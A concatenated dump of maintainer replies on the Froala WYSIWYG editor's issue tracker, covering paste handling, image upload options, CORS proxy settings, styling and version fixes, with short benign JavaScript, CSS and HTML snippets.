we're going to add it only in a major release.. @maverick42 we would need the doc file if possible. Thank you.. @maverick42 we did a little bit of research on that and it looks like Firefox doesn't support font-family: Wingdings and that's why you are seeing it incorrectly.\nhttp://mottie.github.io/Unicode/wingdings.html. @ghedwards are you able to replicate this on our website? Could you please send us a recording of that if so?. @ghedwards I believe the problem is coming from the fact that the table you have there is not HTML valid.. @ghedwards is there a way we can reproduce this error?. The last commit adds the corrections. For the rest of the translations, we're going to make a different commit as there are more missing translations in other languages.. @mthomasson yes, we're going to fix it. Unfortunately, we don't have an ETA for it at this moment.. @pijulius could you please make a record of the screen? Thank you in advance.. @largeden I am not sure I understand the problem you're explaining. Could you please detail?. @mukk85 could you please send us a document sample?. @mukk85 we've just checked this and unfortunately because of the way the HTML comes from Word, at this moment we don't have the possibility to keep this formatting.. You should enable fullPage option for that.. I believe that the problem is not actually coming from the editor. Could you please make a jsFiddle to highlight this problem? Thank you in advance.. @ShanmugaPriyanV we would need the HTML template you had there in the editor. Thank you.. @ShanmugaPriyanV we just tested the content from the jsFiddle you posted and it looks just fine in the email. Basically, the output of the editor, in this case, would be the one at the bottom. We put it in a test by sending that HTML in an email using https://putsmail.com/tests.\nIf you are using Outlook 2017-16, there might be a potential problem with the width CSS property on tables as highlighted on https://www.campaignmonitor.com/css/box-model/width/. Unfortunately, there is not too much which can be done about it. \nhtml\n<p>This is a text. This is a text. This is a text. This is a text. This is a text. This is a text. This is a text.

Thank you in advance.. @SeanKendle Would it be possible to create a recording for it? Thanks.. The editor is designed to show popups inside the scrollableContainer option as long as there is room. I am marking this as an enhancement, however, we're not going to change this behavior in the current major version V2.. It is the full body, not the viewport.. @Tade0 are you able to reproduce it here? https://www.froala.com/wysiwyg-editor/examples/plain-paste. @Tade0, when plainPaste is enabled, all the content is designed to be pasted like this. It doesn't matter if it comes from the editor or from outside. We consider this as being the intended, correct behavior for this option.. @Tade0 @rajchetan this should work as you suggested in the latest 2.7.5 version.. With the last commit, the Line Breaker can be used for that. For now, it is the best solution we can provide.\n\n. Hi @asktalk! No, it is not free. Please find our pricing plans here: https://www.froala.com/wysiwyg-editor/pricing.. Actually, there is one. See: https://github.com/froala/wysiwyg-editor/issues/1678#issuecomment-270628939.. We don't have in documentation explained how to change options after initialization because in most of the cases that is not possible and the right way to go is by destroying the editor and initializing it again. We're preparing some articles for that and they will be available shortly.. Thank you for the suggestion. What we recommend is to use the tags. By default, all the tags are shown, however when clicking them, they are toggled. . @StefanNeuser we've designed tags to work just like filters. By default, no tag is selected because that's how app usually work when no filter is selected, take for example the list of issues on Github. If you would like to have this working differently, it would be better to change the Image Manager and adapt it as per your needs.. @ShanmugaPriyanV I believe this is what you're looking for: https://wysiwyg-editor.froala.help/hc/en-us/articles/115000555949-Can-I-insert-images-as-base64-.. @alkoval you should call the undo.saveStep method after setting the HTML.. @dswitzer thanks for the suggestion. I marked this as a feature-request and I am closing it for now. While this is very helpful, we would make this update just after we can also update the editor SDKs and server-side examples to accommodate it.. The last commit adds a better solution. By default, the editor would use a proxy from cors-anywhere.froala.com and it can be changed to https://github.com/Rob--W/cors-anywhere for more flexibility by clients through the imageCORSProxy option. More details will be added in the documentation with the official release.. @dswitzer I agree that your approach might make fewer requests, however, it involves additional steps configuring the server-side and we'd prefer not to reinvent the wheel in this case and add an additional setup step.. @svanetten1976 are you able to replicate this on our website? Otherwise, we would need a link where we can reproduce it. Thank you in advance.. @SidKH yes, this is how it is designed. I marked this as a feature request, so maybe we're going to add an option for it later on.. @tonyspiro you could do that through the Embedly plugin we offer. https://www.froala.com/wysiwyg-editor/examples/embedly\n\n. @jpgilchrist It is fixed in version 2.7.0.. @cauethenorio please make sure you're using version 2.7.0. This issue is fixed in the latest version.. @fenivana in version 2.7.0 this works as expected.. It's fixed now on master brach.. @mateuszwitkowski at this moment we don't have such an option. I marked this as a feature-request for now and we'll add such an option shortly.. @mateuszwitkowski unfortunately, I don't have an ETA for it at this moment.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. In order to use the editor, you would have to purchase a license from https://www.froala.com/wysiwyg-editor/pricing. We host it on Github so that we can easily publish it to bower and npm and to also have a bug tracker.\nYou can download the editor and take it for a spin before purchasing a license.. @ShanmugaPriyanV could you please provide a link to a page from where we can copy directly with the images? Thank you. . We've just checked and appears to work just fine. Would be happy to check it if you could provide the exact steps to reproduce the issue. Thank you in advance!. @MANETEC we consider this as being the correct behavior as the strong would wrap the zone with contenteditable=\"false\". contenteditable=\"false\" means that content within it cannot be edited, but the one from outside can be edited.. @varmentano the editor height can be set only via the height option.. @TomMettam please make sure you're setting it before initializing the editor. . @Brisstor could you please provide a link from where we can copy it?. @pkhruasu-ui could you please make a recording? Thank you.. @nosukeda thank you for your contribution. We don't accept PR directly here, however, I just added the changes you suggested.. Yes, it can be done like this:\njs\nvar editor = $(selector).data('froala.editor');\neditor.commands.guardFile();. @adamcooper thanks for reporting this. It is fixed on the current master branch.. @andrewobrien Use a textarea instead of a DIV together fullPage option to avoid this. The problem is coming from the fact that there is already another HEAD and BODY tag on the page and the browser strips it out.\nhtml\n<textarea id=\"froala-editor\">\n    <!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n    <html dir=\"auto\">\n      <head>\n        <style type=\"text/css\">\n          h1 {color:red;}\n          p {color:blue;} \n        </style>\n      </head>\n      <body>\n        <ol>\n          <li>Why is the style tag moving from the head to the body</li>\n          <li>Why is the Doctype being replaced?</li>\n          <li>Why is the dir=auto being removed from HTML tag?</li>\n        </ol>\n      </body>\n    </html>\n</textarea>. @bcanseco please make sure you're using editor version 2.7.0.. We'll check.. @bcanseco just tested the master branch and all is good. I believe you did something wrong.. @bcanseco @jackley please turn off https://www.froala.com/wysiwyg-editor/docs/options#imageUploadRemoteUrls.. @adamcooper we just checked it and in this case, the margin comes from Word as being negative margin. If you don't want to take the margin into consideration, I would recommend changing the following option: https://www.froala.com/wysiwyg-editor/docs/options#wordAllowedStyleProps.. @bbugh is there any reason why you don't use the .fr-view class for that? Anyway, you could do it like this in the initialized event: editor.$el.addClass('custom-class').. @btmdave that is right. The option was changed and now you should use codeMirror: window.CodeMirror.. @davidrichied we'll update it shortly. Thanks for pointing it out.. @davidrichied we'll update it shortly.

Thanks in advance.. It should come during the next week.. We just checked it and the problem comes from the getBoundingClientRect method. Unfortunately, in Safari there are few glitches like this one when the coordinates are not correct and we don't have a workaround for that.. @PvanHengel could you please create a recording? I just tried to reproduce it without success.. @igiz0l please send us a document you're pasting from. Thanks.. Related to #1527. Unfortunately, in the current version, we don't have a workaround for it. This problem would be addressed in V3. . We don't think it's right to set expectations that may not be met due to shifting schedules. Therefore, we can't release any information about when it may become available.. @igiz0l thanks for the feature-request..

If you don't want them, then it is best not to include the URLs plugin. . @briantaylorm please make sure you are using the latest version 2.7.1.. @briantaylorm thanks for letting us know about that. We'll check it shortly.. It's fixed on the current master branch.. @jarnovanleeuwen you have 2 options for that: \n1) disable uploading remote URL images: https://www.froala.com/wysiwyg-editor/docs/options#imageUploadRemoteUrls.\n2) Change the default https://www.froala.com/wysiwyg-editor/docs/options#imageCORSProxy option with your custom server https://github.com/Rob--W/cors-anywhere.. @jarnovanleeuwen all the changes we make are highlighted on: https://www.froala.com/wysiwyg-editor/changelog.. It is mainly a similar to #2212. I am closing this, for now, please follow the other issue for updates. . Probably you would want something like this: https://codepen.io/anon/pen/QONLjj. htmlAllowedEmptyTags is more for allowing empty blocks in the editor, not for keeping them there when you backspace.. This should be fixed on the current Github master. If you still have the problem just let us know.. @bryannovoed the current behavior is the correct one. When you delete the last character, the formatting is kept. If you backspace once more, it is removed. . @dswitzer thanks for bringing this to our attention. We're going to check it.. @dswitzer we just tested this and it appears to work correctly in version 2.7.2. Could you please check it and let us know your thoughts?. Should be fixed on the current master.. @dswitzer could you please confirm that you have this problem in version 2.9.1? It looks good to me now. If you still see something incorrect, could you please make a recording?. Hi @dswitzer! We have this for review in the current sprint. Do you think you could help us with confirming if it is working fine now? If not, maybe you could provide a recording? Thanks in advance.. Closing this as per our checks the problem is no longer there in 2.9.1.. It looks like you're using the editor inside a modal. Please make sure you set a higher zIndex option for the editor than the modal.. @javeriaanwer do you think you could make a jsFiddle to highlight this?. There are 2 things you should set:\njs\nzIndex: 15000,\nscrollableContainer: '#window1'. @michaelkoper could you create a jsFiddle or codePen? Thanks.. @Medo42 please send us the image you're trying to upload so that we can check this. Thank you.. @largeden thanks for the suggestions both here and by email. We're going to review them shortly and make some changes to the alignment of the caption.. @dswitzer most of the users want to have images which are inserted via an URL to be uploaded to their own server. imageUploadRemoveUrls option is being used only for helping the upload of images inserted via an URL and images inserted this way are public on the Internet anyway because if they wouldn't be public you couldn't access them. Images which go on https://cors-anywhere.froala.com are being deleted in a matter of minutes as they are the CORS service is using a Heroku Server just as described on https://github.com/Rob--W/cors-anywhere.. Thanks for the feedback, @dswitzer. I just checked the code of the cors-anywhere lib and it actually doesn't download the image, but just makes a proxy for the CORS, so that the image can be accessed via JS. For now, we'll keep it like this and change that if there is another feedback in a different direction.. Unfortunately, because of the way we get the input from the browser on Android browsers this feature is unavailable for now on Android.. Duplicate of #2254.. @largeden thanks for the suggestion. We're going to check it in the upcoming days.. @thexpand this is a problem from your implementation. Please contact tech support via https://www.froala.com/wysiwyg-editor/contact.. @thexpand our tech support will be able to clarify this matter via the support channel. Thank you.. The error is coming from the fact that the editor is using the HTML5 video tag. At this moment, mov is not a supported video type by the browsers: https://www.w3schools.com/html/html5_video.asp.. We decided to disabled showing the link popup at the beginning/ending of links because, in IE, the selection changes at around 200ms after the mouseup event and this causes the link to be returned incorrectly. Unfortunately, this is the best workaround at this moment.\nWe also made a jsFiddle which highlights this situation from IE: click at the end of foo text and watch the browser console.. @linhnguyen1411 are you looking to keep that in the text view? Could you please provide more details?. Thanks for your suggestion @swiftMessenger. I marked this as a feature-request and based on the feedback from other users for this, it would be added or not.. @bryannovoed this looks like a browser rendering issue of the cursor. Unfortunately, there is not too much we can do from our side.. @mukk85 clear formatting is designed to remove the inline style, but not from the block tags, such as P, H1, H2, 'LI', 'Ol', 'UL', etc.. At this moment, there is no built-in feature for that. Yes, it removes the inline formattings such as span, strong, a, etc. . @nainashukla3300 please make sure you implement it as described in our examples: https://github.com/froala/wysiwyg-editor/blob/master/html/3rd-party/bootstrap/modal.html#L44.. @jamesmoss it will be released in a couple of days.. Image loaded by file:// protocol are controlled by the following option which by default is false: https://www.froala.com/wysiwyg-editor/docs/options#pasteAllowLocalImages. @jamesatplebble please send us the document you're pasting from. Thanks in advance.. @jamesatplebble what Microsoft Word version are you using?. @dswitzer unfortunately, this is the way we're getting the data in the clipboard. \n@jamesatplebble I'm closing this due to lack of response. Would be happy to check it if you could send us the doc you're pasting from. Thanks.. Last commit adds the https:// protocol by default. . That seems to be introduced in FF 56 and it is happening on backspace. . @chrisdeeming do you think you could make a recording of how to reproduce this on our website?. @chrisdeeming I believe it's something from Firefox which has been fixed in the meanwhile. I am closing this. If you see it again, please send us a recording.. You could do something like this:\njs\n$(selector)\n  .on('froalaEditor.initialized', function (e, editor) {\n    editor.$el.on('click', 'img', function () { ... });\n  })\n  .froalaEditor(). @javeriaanwer it is best to reach Wiris because they are handling the Wiris integration for the editor. . By default, the editor uploads the images and files to our servers so that you can test how the editor works right away. However, they are stored there only temporary and might be deleted at anytime. We do strongly recommend to change this and upload it to your own server. Please read more about that on our website:\nhttps://www.froala.com/wysiwyg-editor/docs/concepts/image-upload. \nThe Advanced Image options is using Adobe Aviary ad that's why there is a request made over to Aviary for processing the image.. @javeriaanwer the Advanced Image editor is an integration for Adobe Aviary. For the advanced image processing, yes, it is required to hit the Adobe servers.. Unfortunately, we cannot control the printing options from the editor.. The best way to disable the editor classes for images would be to remove the imageAlign and imageDisplay buttons from the imageEditButtons option.. @SeanKendle you are right. We'll update the editor to accommodate this case.. @SagarKharche thanks for reporting this, however, we consider this as being the correct behavior.  A list item is indented in the previous list item from the same level. If no previous list item is present at the same level, then the list item remains unchanged.. It's fixed on the current master branch.. @d3chapma would it be possible to create a jsFiddle for it? Thank you.. The fontSizeUnit allows to specify the font-size unit by default, however, it does not address the issue explained by Diana.. @etarel most likely the pasted images have some inline style which overrides all the editor alignment options for images.. Nice catch! \ud83d\udc4d . It is disappearing because the focus moves to another input (the one from the popup). It is not possible to have 2 selections at the same time on a page. However, the editor knows to store that and apply the color correctly.. @ShanmugaPriyanV it would be really helpful if you could send us the documents to copy/paste from. Thanks in advance.. @ShanmugaPriyanV we just tested this and we don't consider the problem as being from the editor:\n- Word and PowerPoint: the font size is kept, however, the font family used by Word is Calibri and that's why it might look different in the browser. \n- PDF: this is the way we get data from the clipboard. Unfortunately, there is nothing we can do about it.\n- Excel: Pasting from Excel creates a table. This is the correct behavior. When pasting directly from a table cell, we don't get the formatting in clipboard, so there is nothing we could do about it.\n- HTML: looks fine.. @ShanmugaPriyanV could you please send us a document/place to paste from in the editor? Thank you.. @ShanmugaPriyanV are you experiencing this on our website? Could you please make a recording?. @ShanmugaPriyanV we just tested it. In the HTML which comes from Word, the last 4 paragraphs are actually a single one although they look like different ones. The HTML is similar to the following one, where there are only 2 main paragraphs because on the other ones there are SOFT new lines.\nhtml\n<p>paragraph 1</p>\n<p>paragraph2 <br><br> line 3<br><br> line 4</p>. @seraOh we're aware of this, unfortunately, there is no workaround for it at this moment. At the time a paragraph is split on ENTER key, it recreates the existing one and that makes the iframe from YouTube to reload.. @bryannovoed the editor is handling the undo steps by using the typingTimer option. Based on how quick you press backspace that change would go to the undo stack.. Unfortunately, the iOS toolbar is applying the formats different than the editor and that's why they are not being removed. I am marking this as a feature-request and wontfix for now.. @bryannovoed thanks for reporting this. However, there is not too much we can do about it because the editor toolbar is designed to close on scroll in order to improve performance. On scroll it might be required to recompute position and that would create an overload.. @Brisstor that is how it is designed to work. The link is made on space, dot or enter.. Thanks for your contribution to the German translation, @senfi .. The best way is to do it like here, but use the fr-disabled class: https://wysiwyg-editor.froala.help/hc/en-us/articles/115000592265-How-can-I-make-a-custom-button-active-.. defaultFontFamily option is designed to be used when the selection is outside of the editor. If you would like to change the default font-family to Arial the best way is to do it via CSS: https://jsfiddle.net/rmooksaL/1/.. @nickvoegeli it is designed to be as a placeholder when there is no selection in the editor. It helps end-users to get familiar with what options they have there. . @sureshy02 for tech support regarding image upload please contact us via our website https://www.froala.com/wysiwyg-editor/contact. js\n$('selector').data('froala.editor').el.textContent;. We consider the current behavior as being the correct one. There is a rule inside CSS which is set for such cases:\ncss\n.fr-view span[style~=\"color:\"] a {\n    color: inherit;\n}. @javeriaanwer for any help regarding the Wiris Editor please reach the Wiris team instead.. @topherdavis inside HREFs, &amp; is always converted to &. Is there any specific reason why would you need there &amp inside a link? This is how browsers work and you can easily see that in this jsFiddle: https://jsfiddle.net/t3504s5v/. @natashad the problem is coming from the fact that you have no DOCTYPE set to the page:\nhtml\n<!DOCTYPE html>. @tschoppi we don't accept PR directly here because we do all the development in a private repo and the public code is committed from there. We would be happy to make this changes in such a way to give attribution, however, for that we would need your Github email which none of you guys have it listed public. \nThanks for your contribution!. @kaniansky would it be possible to send us a link from the page where you're pasting from?. @cmkind this should be fixed on the current Github master. Could you please check?. Closing this due to lack of response.. It looks like undo.saveStep should be called in the inserted.atwho event from At.js.. For that you should enable the iframe or fullPage option.. @P-Hayk the best way to add validations to the editor is to get the HTML using html.get method and validate that HTML output.. @P-Hayk please see the example from Github for reactive forms: https://github.com/froala/angular-froala-wysiwyg#model.. The \"Open in New Tab\" refers to the link from the output, not to what happens when you click on Open Link inside the link popup. . Thanks for the feature-request, @Zynde. We have this on our TODO list already.. Unfortunately, we cannot provide an ETA for it yet.. @yunClouds the current behavior for indent action is the correct one. I marked this as a feature-request and we might add it in the future. . @chrisdeeming at this moment we're not doing any special things on enter/backspace. What is happening now is coming from how the browser handles it.. @cauethenorio are you using the latest 2.7.3 version?. @topherdavis @jemunk could you please let us know where you're pasting from? Thank you.. @topherdavis @jemunk it's fixed on the current master branch from Github and will be included in release 2.7.4.. @cjpollard could you please make a jsFiddle for this?. @gae123 last commit should do the trick. Please follow the instructions from for including the shim https://fontawesome.com/how-to-use/upgrading-from-4. . See https://www.froala.com/wysiwyg-editor/docs/methods#html.insert. @mikolajkosmal most likely you have some CSS on the page which removes the bullets for lists inside the editor.. @Apee we're working on finding a workaround for it, however, we cannot provide an ETA for it yet.. @petester42 it is fixed. In the Plunker you sent, you updated only the CSS to 2.7.5, not the JS.. @sirtastic it's fixed on the current master branch (v2.7.4).. @wkurtz this is fixed in version 2.7.4 already released.. @angusgrant we just checked this and it appears that somehow the modal: true option (http://api.jqueryui.com/dialog/#option-modal) from jQuery UI is preventing making those changes. And here is the code from jQuery UI which does that.. @achambers that CSS is being used to prevent selecting the text inside contenteditable=\"false\". Adding that CSS would allow indeed selecting the text, however, it is not the best approach. We're working on something different which would allow adding non-editable zones without making use of the contenteditable=\"false\". . We run few more tests and it appears that those CSS lines are no longer necessary. Last commit fixes it.. That is because the response format is not correct. It should be a json like this:\njson\n{ \"link\": \"path/to/image.jpg\" }. That's happening because some of the default styles are being removed. We would suggest doing it like this instead if you are using a version older than 2.7.4. If you use the current master branch, not change should be made.\njs \niframeStyle: $.FroalaEditor.DEFAULTS.iframeStyle + 'body>p:last-child{margin:0}'\n  . contenteditable=\"false\" can be deleted/copied/cut as a whole. We consider this as being the correct behavior. Here is a jsFiddle with the default browser behavior: https://jsfiddle.net/froala/gd9q09kk/.. Heading action is designed to be applied to the current block, not to the selected text. The current behavior is the correct one.. @largeden it would be amazing if you could do that. We don't accept PR directly here, however, if you make one we could use that code and commit it with you as author.. Now there is the url.linked event which gets the auto-linked link as a parameter.. @laharshah the event is for auto-linked urls, not for links. For links is best to use the link.beforeInsert event and change the attributes there.\n. @inssein thank you for your feedback on this. Maybe the docs are not clear enough. The ENTER_P option is indeed converting new lines into paragraphs by default.. @inssein it does both actually. converts the old lines and the new lines as well.. @javeriaanwer please upgrade to version 2.7.5.. @javeriaanwer this should be fixed in the current master version. Could you give it a try?. @javeriaanwer do you think you could give this a try with the latest Github master? Thanks in advance.. Closing this as it should be fixed with the Github master. https://www.froala.com/wysiwyg-editor/docs/options#htmlAllowedAttrs\nhttps://www.froala.com/wysiwyg-editor/docs/options#htmlAllowedStyleProps\nhttps://www.froala.com/wysiwyg-editor/docs/options#htmlAllowedTags\nhttps://www.froala.com/wysiwyg-editor/docs/options#pasteAllowedStyleProps\nhttps://www.froala.com/wysiwyg-editor/docs/options#pasteDeniedAttrs\nhttps://www.froala.com/wysiwyg-editor/docs/options#pasteDeniedTags. @PvanHengel I marked this as a wontfix for now. It looks At.JS made lots of changes recently which are no longer compatible with the way the editor is designed and we're looking forward to adding a built-in solution for the editor.. @PvanHengel unfortunately, at this moment we don't have an ETA for it.. We're going to add a built-in mention plugin -https://wysiwyg-editor-roadmap.froala.com/public/ideas/5047. I would encourage you to upvote it on our roadmap so that it gets more priority.. @Smashr are you getting the same error if you use only [data-delay] instead of *[data-delay]?. @Smashr sorry for the delayed response. We've just tested this and the error is not there anymore when using only [data-delay] instead of *[data-delay].. @pdehne it is best to use absolute paths in this case.. @suryaiiit that option is referring to what is displayed by default when there is no selection in the editor. For what you're trying to achieve, please see: https://wysiwyg-editor.froala.help/hc/en-us/articles/115000817105-How-can-I-set-a-default-font-style-.. > that option is referring to what is displayed by default when there is no selection in the editor. It reflects only in the toolbar, not on the editor text.\nI marked this as a feature-request so that we can add an option later on for specifiyng the default style.. By default, the editor is initialized on page load.. @theknet thanks for the feature-request.. @ShanmugaPriyanV are you able to reproduce this on our website, or at least send us a link to a page where we can reproduce it?. @ShanmugaPriyanV we've tried to reproduce this in multiple environments without success. If you would like to override the HTML which gets in there, I would recommend to use the paste.before event and replace those characters with empty space.. @theknet we just checked this. The link edit popup is designed to be able to contain other things, not only buttons. Therefore, we introduced a better approach. To disable the link edit popup, use the following code instead before initializing the editor:\njs\n$.FroalaEditor.POPUP_TEMPLATES.link.edit = null;. @theknet thanks for bringing this to our attention. Should be fixed now on master.. @marissahart would it be possible to send us a doc you're pasting from?. Nice catch!. @javeriaanwer could you please check you're using the latest version 2.7.3?. @javeriaanwer please use the latest 2.7.3 where this shouldn't happen. If you still have the problem with the latest version just let us know.. @javeriaanwer are you able to reproduce this on our website as well? What browser and OS are you using?. @javeriaanwer could you please send us a link to a page where we can reproduce it? Thank you.. @javeriaanwer can you please try the latest Github master? This should be fixed now.. The best way of doing that would be by changing the help.js plugin.. @tschoppi the fonts used there are the default fonts available on MacOS system.. @tschoppi on our website we're using Arial, Helvetica, sans-serif; and it shows all the characters. When it comes to custom fonts you might be a little limited on what characters can be used. Thanks for sharing your tests which show DejaVu Sans as a winner for those who don't want to use the default Arial, Helvetica font.. Unfortunately, because of the way we get data in the clipboard, pasting images when copied from the Finder is not possible in Firefox.. @pijulius thanks for bringing this to our attention, however, it doesn't appear to be a problem from the editor. It should be quite easy to test that. Just create that iframe where the editor is, but instead of initializing the editor, just display a Font Awesome icon.. @jackley are you still seeing this if you turn off https://www.froala.com/wysiwyg-editor/docs/options#imageUploadRemoteUrls?. @aaclayton see https://www.froala.com/wysiwyg-editor/docs/options#imageUploadRemoteUrls.. @Chandrika-Desai the paragraph dropdown is designed to change the entire paragraph to h1/h2, not only the selected text. If you would like to change it as per your request, we would recommend using the format.apply method.. @javeriaanwer at this moment we don't have a feature for doing this. It is already on our TODO list and it should land in the editor in the following months. . @zgorbe the modals weren't designed initially to be extended. We have more and more requests for doing this and we're working on allowing to use any content inside the modal. An update should come for this shortly.. It hasn't been added yet.. Unfortunately, I do not have an ETA for it at this moment. . We're not going to add it by default. However, if you would like to achieve this, please add the following:\ncss\n.fr-view ul, .fr-view ol {\n  list-style-position: inside;\n}. See https://wysiwyg-editor.froala.help/hc/en-us/articles/115000817105-How-can-I-set-a-default-font-style-.. @dcporter44 another way that you could use is to wrap the editor content into a different class and set the styles for that. It is not recommended to use inline styles, but rather use stylesheets .. @docikaci could you please let us know where you're copying from?. We consider the current behavior as being correct. Select alignment should align each item, not the whole list.. Thanks for the feature-request.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. @nsamsonov for any problems related to Angular implementation please open an issue on the Angular repo (https://github.com/froala/angular-froala-wysiwyg). The froalaView directive is designed only to wrap the output of the editor in the layout required (a DIV with the fr-view class). To sanitize the HTML displayed by the froalaView, we would recommend using the Angular Sanitizer: https://angular.io/api/core/Sanitizer.. Sure, https://www.froala.com/wysiwyg-editor/docs/events#commands.after.. @chrisdeeming @Nirjonadda it should be fixed on the Github master. Could you please check that? Thank you.. @chrisdeeming we haven't been able to reproduce it in the jsFiddle. Could you please make a recording? Thanks.. Oh, thanks for confirming that it is fixed now.. @javeriaanwer what OS are you using? Thank you.. We just checked this and it looks like there is a problem in Chrome in some cases when position fixed is used. We'll try to find a workaround for this situation, however, for now, it will remain a wontfix.. @Trapdafifou a PR would be highly welcome. Thank you. Please update https://github.com/froala/wysiwyg-editor/blob/master/js/languages/fr.js.. @sbrouillard we don't merge PR directly here. We just added a commit to address this problem. Thanks for reporting it.. @largeden what browser and OS are you using? Are all plugins enabled?. It is OK to do the file check in the drop callback. It does 2 things:\n1. If an image is dropped, the file is not inserted so that the image plugin can do the job (file.type.indexOf('image') < 0)\n2. Checks that the file is allowed ((editor.opts.fileAllowedTypes.indexOf(file.type) >= 0 || editor.opts.fileAllowedTypes.indexOf('*') >= 0)). It doesn't make sense to do any processing and get to the upload step.\nThe last commit should fix by doing a check on the image type instead.\n. Just checked it. If the mime type is not there, then the file shouldn't pass the upload filter. . @largeden that is an interesting debate, however, I think it is unlikely to have no file type in the future. \ud83d\ude04 . @dragokas could you please send us a link to a page where we can reproduce it?. @dragokas shall we be logged in? What OS are you using?. Thanks for the details. Do you think you could create a dummy account for us? This would make the debugging process faster. . @dragokas we don't support Opera Presto browser as an official browser because Opera removed the support for it.. @javeriaanwer when pasting from Word, please make sure you have the Word Paste plugin enabled in order to keep text formatting. . @javeriaanwer could you send us the document you're pasting from? What Window version and Edge version are you using?. Unfortunately, in Edge, we get the content from Microsoft already cleaned-up and we cannot make any additional processing and detect that it's coming from Word.. @scottblinch we couldn't reproduce the problem. Could you make a recording to explain it? Thanks in advance.. @scottblinch this should be fixed on the current Github master.. @bpautsch could you please make a jsfiddle for it?. https://wysiwyg-editor.froala.help/hc/en-us/articles/115000555949-Can-I-insert-images-as-base64-. @mrahhal we would be happy to assist if you could provide a jsFiddle.. @killtw please see https://github.com/froala/wysiwyg-editor/issues/1042#issuecomment-178143444.. @ankitjain28may we do not merge outside contributions for new plugins. What we could do instead is to set up a demo on our website for it: https://www.froala.com/wysiwyg-editor/examples. Could you please send us the code here?. @ankitjain28may thanks for sharing the code. We'll have to make some cleanup on it before adding to our website.. @CrazyClicker could you please make a jsFiddle?. Thanks @bertoost. We don't merge PR directly here, but I just added your contribution: https://github.com/froala/wysiwyg-editor/commit/98f6732e607fd810e5d34d33e6885c5359676fb9.. @khoanguyen could you please put that HTML in a TXT file and send that file over to us? Thank you.. @khoanguyen we couldn't replicate this yet. Could you please add the following code inside your app and let us know what you get in the console?\njs\n$(selector).froalaEditor().on('froalaEditor.paste.beforeCleanup', function (e, editor, html) {\n  console.log(html);\n});. @khoanguyen thanks for all the details. The last commit should fix it.. You could download the latest 2.7.6-dev from Github or wait the official release for 2.7.6.. @cahyowhy It is best to use the image.uploaded event, return false inside it and then insert the image using the image.insert method.. @ThePokyWizard this should already be fixed on the current master from Github.. @largeden this is not happening when typing. Could you please double check? :). Thanks for testing!. @chrisdeeming are you able to reproduce this on our website as well?. Please see https://codepen.io/anon/pen/aqoQqp.. @wrporter could you please make a jsFiddle? Thanks in advance.. @wrporter those styles are needed in order to display the editor elements properly inside the iframe. If you don't want to have them added, as a workaround, you could do the following 2 things:\n  1. Don't include the froala_style CSS file on the page you're initializing the editor on.\n  2. Use the iframeStyleFiles option so that you can still have the elements inside the editor displayed correctly.. Thanks @solarwalker. We just added the changes you suggested.. @rokobasilisk the images are fetched by the browser through the IMG tag in HTML. As far as we know it is not possible to pass an authentication header to them. . @BrianLaughlan you could do it like this:\njs\n$('selector').froalaEditor().on('froalaEditor.popups.show.link.insert', function (e, editor) {\n  var $popup = editor.popups.get('link.insert');\n  $popup.addClass('your_custom_class');\n});. @markedmondson could you please let us know what options are you using for the editor?. We couldn't replicate it on our side. Do you think you could put together a jsFiddle?. @markedmondson Looking for the jsFiddle. While it appears to come from the useClasses: false, we couldn't replicate it. Thanks in advance! . @lucassimibueno could you provide a jsFiddle? We can't replicate it at our end for now.. @markedmondson @lucassimibueno we managed to replicate it. We'll post a workaround shortly.. We'll most likely put a 2.7.4-1 version. Still discussing that. . Please find a snippet for changing the height below.\njs\nvar editor = $('selector').data('froala.editor');\neditor.opts.height = 300;\neditor.size.refresh();. Error code 4 means that the response format is incorrect. Please make sure it comes as a JSON formatted like this:\njson\n{ \"link\": \"path/to/image.jpg\" }. @smoockpp it looks like you are doing something wrong. Could you create a Plunker for it?. @N1cE-tm it should be updated now. The Packagist is doing a fetch from time to time and it looks they haven't updated the package automatically. . @NordicLight I believe you have some style there on the page which conflicts with it. We don't have any specific CSS for that. If you could make a jsFiddle or send us a link to the page where you have this problem, I would be happy to check.. Thanks for the follow-up, @NordicLight.. @LaurenceKaye it should be fixed on the current Github master. Could you please give it a try?. see https://jsfiddle.net/kyfotvfb/6/. @ibtisamniche-vteams unfortunately, when pasting from Google Docs, all the styling comes inline which is not ideal. If you would like to keep all that formatting, all you should do is to change the pasteDeniedAttrs to pasteDeniedAttrs: ['class', 'id'].. Duplicate of #1307.. @divdax we use this repo for bug-tracking. Feature requests are not left open, however, we add a feature-request label to them and they are to our attention.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. @mikeshow do you think you could make a jsFiddle?. @mikeshow it should be fixed in version 2.7.6.. @petester42 the current behavior is the correct desired one. When removing the element between text nodes with backspace, and there are 2 text nodes one to another, the editor is designed to join them together. This is called node normalization: https://developer.mozilla.org/en-US/docs/Web/API/Node/normalize.. I apologize, I misunderstood your initial message. We are working directly with the selection API offered by the browser. This problem is coming from how the selection API works and there is not too much we can do to overcome it. The same situation happens sometimes when you just put the cursor at the beginning of the P tag an get the selection.\nUnfortunately, the selection info across browsers is not consistent and sometimes you would have to write some custom code to detect such situations. What I would recommend in this situation would be to do a check for this particular case. Something like this:\njs\nvar range = editor.ranges(0);\nif (node.childNodes.length > 0 && node.childNodes[range.startOffset]) {\n  child = node.childNodes[range.startOffset];\n}. @rajchetan the current editor version is designed to create output without zero-width spaces. Is there any reason why you would need to have those in the text?. @rajchetan I would recommend removing the &8203; character with an empty string before adding it to the editor. Probably, the old editor was using it in order to make editing possible in some edge situations, however, it should not be present in the output. . They should be loaded via iframeStyleFiles option: https://codepen.io/anon/pen/oEBWGN.. @jjaraMplus could you please provide a jsFiddle?. @jjaraMplus do you think you could send us a link to the page where you have this problem? Is there any way we could reproduce it?. @jjaraMplus this should be fixed on the current master. If you still experience the problem please create a jsFiddle and we'd be happy to look into it. You could use the following as a starting jsFiddle: https://jsfiddle.net/froala/wc5c3jhk/.. @jjaraMplus please reach out support team via https://www.froala.com/wysiwyg-editor/contact. That is happening because of the CSS added in the jsFiddle, not because of how the editor is handling it.\ncss\nbody > .fr-quick-insert {\n  position: static;\n  width: 40px;\n  